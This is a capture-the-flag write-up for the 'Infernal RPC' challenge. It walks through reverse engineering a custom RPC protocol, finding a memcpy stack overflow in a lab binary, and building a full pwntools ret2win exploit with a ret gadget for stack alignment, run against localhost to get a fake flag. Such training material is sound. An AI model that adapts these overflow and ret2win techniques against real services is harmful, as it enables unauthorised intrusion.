# Writeup: Infernal RPC (Buffer Overflow (Ret2Win) + Custom Protocol)

> **By:** Randy Nin

---

## Initial Reconnaissance

The first thing we do when facing this challenge is analyze the base binary. If we run a basic analysis with `file` and `checksec`:  
![](resources/Pasted%20image%2020260920173509.png)

We can observe that it is a binary compiled for Linux (**ELF**) of **64-bits**, dynamically linked (meaning it uses OS libraries to call functions like, for example: fgets, gets, printf, etc.). We can also observe in the protections how it has the **NX** protection (which makes the stack non-executable. Basically, it is not possible to inject shellcodes) and that no **canaries** were found (so it is possible to overwrite the stack without worrying about the canary validation) and it doesn't have **PIE** enabled either (so the binary's memory is not randomized, and with tools like gdb we can obtain parts of its memory and guarantee that they will be the same on each execution. Basically, a memory leak is not necessary).

When running the binary `./infernal`, the program doesn't ask us for input directly in the terminal, but instead starts a network service:

![](resources/Pasted%20image%2020260920174142.png)

This tells us that we must communicate with it through TCP sockets on port 1337. It also gives us crucial hints: it mentions that it is an **RPC** server, with a Program ID 0x20001337 and a Version 1.

### Short definition of RPC (Remote Procedure Call)

> In short, RPC is a protocol that allows a client program to execute a function (procedure) on a remote server as if it were a local function.

### RPC packet structure

- **XID (Transaction ID):** A random number to identify the request.
    
- **Message Type:** A CALL (request) or a REPLY (response)
    
- **RPC Version:** RPC version (1 or 2).
    
- **Program ID:** The identifier of the program we are calling (the output told us it was `0x20001337`).
    
- **Program Version:** The program version (the output told us it was 1).
    
- **Procedure:** The number of the specific function we want to execute.
    
- **Credentials & Verifier:** Authentication data (in this case we will leave this empty because it has no validation).
    

> **Note:** Therefore, RPC implementations over TCP use something called the `Record Marking Standard`. This means that before the RPC header, the client must send 4 bytes that indicate the total length of the packet.

---

## Reverse Engineering (Building the RPC Packet)

Knowing that the server expects an RPC packet, the next step is to open the binary in a disassembler (in this case I like Ghidra) and we can analyze the `main` function to see how it processes incoming connections.

### The fragment header (Record Marking Standard)

Analyzing the main loop that handles the sockets in the `main` function, we notice that the program doesn't read the raw data directly. Instead, as we mentioned before, it first tries to read 4 initial bytes.

![](resources/Pasted%20image%2020260920181107.png)

In Python with the PWN tools library, we can reconstruct that packet this way:

```python
fragment_header = p32(0x80000000 | len(packet_data), endian='big')
```

> **Notes:**
> 
> - This has to be built after the RPC packet itself since we need its size `len(packet_data)`.
> - In RPC the packets travel in big endian format `endian=big`.

### Building the RPC packet

After that, the program calls a function we can call `xdr_read_u32` several times. In Ghidra we can observe a series of comparisons that our packet must meet in order not to be rejected.

![](resources/Pasted%20image%2020260920182749.png)

1. **XID (Transaction ID) - Line 125:** Reads the first 4 bytes (`__ptr`) and since it is not validated, we can send any random value.
2. **Message Type - Lines 126 and 131:** Reads the offset `+ 4` and verifies that this value (`iVar3`) is strictly `0` (indicating that it is a CALL).
3. **RPC Version - Lines 127 and 131:** Reads the offset `+ 8` and verifies that `iVar4` (RPC Version) is `2`.
4. **Program ID - Lines 128 and 132:** On line 128, it reads the offset `+ 0xc` and we see the validation that says the value (`iVar7`) must be `0x20001337` (the same Program ID we saw in the server's initial output).
5. **Program Version - Lines 129 and 133:** Reads the offset `+ 0x10` and requires that this value (`iVar8`) be `1`.

Seeing this structure and the validation that this binary does, it is possible to build the base of our packet in our script with pwntools:

```Python
rpc_header = b""
rpc_header += p32(0x11223344, endian='big')     # XID
rpc_header += p32(0, endian='big')              # CALL (0)
rpc_header += p32(2, endian='big')              # RPC Version 2
rpc_header += p32(0x20001337, endian='big')     # Program ID
rpc_header += p32(1, endian='big')              # Version 1
rpc_header += p32(5, endian='big')              # Procedure 5
rpc_header += p32(0, endian='big')              # Cred flavor
rpc_header += p32(0, endian='big')              # Cred length
rpc_header += p32(0, endian='big')              # Verf flavor
rpc_header += p32(0, endian='big')              # Verf length
```

This way, we manage to talk to the server and pass all the initial security barriers to reach the vulnerable function.

---

Since in the previous step we indicated procedure 5, the program flow enters this `case 5:` block. Before calling the function that we will see is vulnerable (`process_data_impl`), the program processes a specific data structure:

![](resources/Pasted%20image%2020260920190437.png)

Observing from lines 209 to 216 in the code we see how the program reads 6 32-bit integers calculating the offsets 4 bytes apart: `+ 4`, `+ 8`, `+ 0xc`, `+ 0x10`, `+ 0x14`.

> **Note:** But we can also observe more things:
> 
> - On line 211, the program reads the value at **offset 0x8** and stores it in the variable `uVar19`.
> - On lines 218-220, a call to `fprintf` gives away the exact purpose of this variable, printing `uVar19` with the name `header.length`.
> - Then, on line 222, there is a validation: `if (uVar19 < 0x801)`. This means that our size must be less than 2048 bytes, a limit wide enough for our buffer overflow to work. Basically, setting the value of offset 0x8 to less than 2048 bytes is enough.

Knowing exactly where the program looks for the length of the data, we build the header specific to Procedure 5 as follows:

```python
proc5_header = b""
proc5_header += p32(0, endian='big')            # offset 0x0
proc5_header += p32(0, endian='big')            # offset 0x4
proc5_header += p32(len(payload), endian='big') # offset 0x8  <- Here it reads header.length (I put the payload length, but as long as it is less than 2048 bytes it is enough)
proc5_header += p32(0, endian='big')            # offset 0xc
proc5_header += p32(0, endian='big')            # offset 0x10
proc5_header += p32(0, endian='big')            # offset 0x14
```

---

## Finding the vulnerability

With the packet format already defined, we were able to send valid requests to the server and reach the target function (`process_data_impl`):

![](resources/Pasted%20image%2020260920192825.png)

To understand what this function did, I analyzed its decompiled and assembly code, managing to find a **Stack-based Buffer Overflow** vulnerability.

### Buffer Overflow summary

> Basically, the stack buffer overflow vulnerability happens when the program doesn't validate well or uses vulnerable functions that don't validate the amount of memory to write on the stack. This way we can take advantage of it to write data beyond the defined buffer, managing to overwrite the function's return address (EIP/RIP) to direct the program flow to the memory address we indicate.

The function prepares a call to `memcpy` (copy memory). In 64-bit architecture, the arguments are passed in the registers `RDI`, `RSI` and `RDX`.

![](resources/Pasted%20image%2020260920194257.png)

**Explanation of the vulnerability:**

- **Fixed destination:** The program reserves a space on the stack pointing to `[rbp-0x60]`. `0x60` is 96 bytes in hexadecimal (that is the real size of the local variable).
- **We control the size:** The size of the bytes to copy (`RDX`) is the value we pass in the packet (at offset `0x8` of the `proc5_header`).
- **There is no validation:** We can pass it an amount greater than 96 bytes and since the program never validates it, memcpy will do it without asking anything.

This way, if we tell it that we want to copy, for example, 200 bytes, memcpy will do it, managing to overwrite larger memory spaces, like the RBP pointer and the most telling one, the return address (RIP).

---

## Developing the exploit (Ret2Win)

To control the program flow and obtain the flag, we need to overwrite the `RIP` with the address of the `infernal_maintenece` function (which is at memory address `0x401973`), the one that opens the flag and sends us its content.

![](resources/Pasted%20image%2020260920195712.png)

![](resources/Pasted%20image%2020260920195909.png)

### Calculate the offset

To calculate the offset (the number of bytes up to overwriting the return address) we use the `cyclic` function from pwntools to send a 200-byte pattern:

```Python
from pwn import *

context.arch = 'amd64'


payload = cyclic(200) # <-- Cyclic to calculate the offset
proc5_header = b""
proc5_header += p32(0, endian='big')            # offset 0x0
proc5_header += p32(0, endian='big')            # offset 0x4
proc5_header += p32(0x600, endian='big') # offset 0x8  (Here it reads the memcpy size)
proc5_header += p32(0, endian='big')            # offset 0xc
proc5_header += p32(0, endian='big')            # offset 0x10
proc5_header += p32(0, endian='big')            # offset 0x14

rpc_header = b""
rpc_header += p32(0x11223344, endian='big')     # XID
rpc_header += p32(0, endian='big')              # CALL (0)
rpc_header += p32(2, endian='big')              # RPC Version 2
rpc_header += p32(0x20001337, endian='big')     # Program ID
rpc_header += p32(1, endian='big')              # Version 1
rpc_header += p32(5, endian='big')              # Procedure 5
rpc_header += p32(0, endian='big')              # Cred flavor
rpc_header += p32(0, endian='big')              # Cred length
rpc_header += p32(0, endian='big')              # Verf flavor
rpc_header += p32(0, endian='big')              # Verf length

packet_data = rpc_header + proc5_header + payload
fragment_header = p32(0x80000000 | len(packet_data), endian='big')

p = remote('127.0.0.1', 1337)
p.send(fragment_header + packet_data)
```

Running the binary and debugging with pwndbg, we can observe that it crashed and that the first 4 bytes of the RSP register correspond to `baab`. The first 8 bytes of this register are the ones that will be passed to RIP (the register that defines the next instruction), only that, unlike 32-bit where these are put directly into EIP without validating whether this memory address exists, in 64-bit it first validates and since we didn't pass it a valid one it crashes, but we can observe them in RSP (so that if we pass it a valid 8-byte address, that will be the program's next execution).  
![](resources/Pasted%20image%2020260920200533.png)

In pwndbg we can pass it these first bytes and with the `cyclic` function itself see the offset, and we can observe that it is 104 bytes. This way we simply have to put 104 junk bytes and then 8 bytes corresponding to the memory address of `infernal_maintenece`.  
![](resources/Pasted%20image%2020260920200616.png)

## Stack alignment

With the offset and the address of the function with the flag, we built our payload. But when testing it, locally it did work and returned the flag to us, but remotely the server closed the connection without the flag.

When exploiting a Buffer Overflow and jumping directly to `infernal_maintenance`, we corrupted that stack alignment of 16-byte multiples, leaving the stack misaligned by 8 bytes (this depends on the exact environment of the remote server, but personally I always do this alignment so it always works).

**Solution:** The `ret` gadget.  
To realign the stack before entering the winning function, we use a classic ROP (Return Oriented Programming) technique. We look for a harmless `ret` (return) instruction inside the binary itself.  
![](resources/Pasted%20image%2020260920201809.png)

This `ret` instruction simply pops 8 bytes off the stack and jumps. By putting this gadget (`0x40101a`) before our winning function, we force the program to "make an empty jump", pushing the stack 8 bytes and leaving it perfectly aligned to 16 bytes for when it finally enters `infernal_maintenance`.![](resources/Pasted%20image%2020260920201809.png)

The payload ended up like this:

```python
payload = asm('nop') * 104
payload += p64(0x40101a)
payload += p64(0x401973)
```

> **Note:** `asm('nop')` are simply bytes that represent **No-Operation** instructions (`0x90`). Basically a CPU instruction that performs no action beyond advancing the program counter.

---

## Final Payload and Flag

```python
from pwn import *

context.arch = 'amd64'

payload = asm('nop') * 104
payload += p64(0x40101a)
payload += p64(0x401973)

proc5_header = b""
proc5_header += p32(0, endian='big')            # offset 0x0
proc5_header += p32(0, endian='big')            # offset 0x4
proc5_header += p32(0x600, endian='big') # offset 0x8  (Here it reads the memcpy size)
proc5_header += p32(0, endian='big')            # offset 0xc
proc5_header += p32(0, endian='big')            # offset 0x10
proc5_header += p32(0, endian='big')            # offset 0x14

rpc_header = b""
rpc_header += p32(0x11223344, endian='big')     # XID
rpc_header += p32(0, endian='big')              # CALL (0)
rpc_header += p32(2, endian='big')              # RPC Version 2
rpc_header += p32(0x20001337, endian='big')     # Program ID
rpc_header += p32(1, endian='big')              # Version 1
rpc_header += p32(5, endian='big')              # Procedure 5
rpc_header += p32(0, endian='big')              # Cred flavor
rpc_header += p32(0, endian='big')              # Cred length
rpc_header += p32(0, endian='big')              # Verf flavor
rpc_header += p32(0, endian='big')              # Verf length

packet_data = rpc_header + proc5_header + payload
fragment_header = p32(0x80000000 | len(packet_data), endian='big')

p = remote('127.0.0.1', 1337)
p.send(fragment_header + packet_data)

try:
    response = p.recvall(timeout=2)
    log.success("Respuesta recibida")
    print(response.decode(errors='ignore'))
except Exception as e:
    log.failure(f"Error al recibir: {e}")
```

```bash
❯ py exploit.py
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] Receiving all data: Done (33B)
[*] Closed connection to 127.0.0.1 port 1337
[+] Respuesta recibida
PENTRAZE{FAKE_FLAG_FOR_TESTING}
```
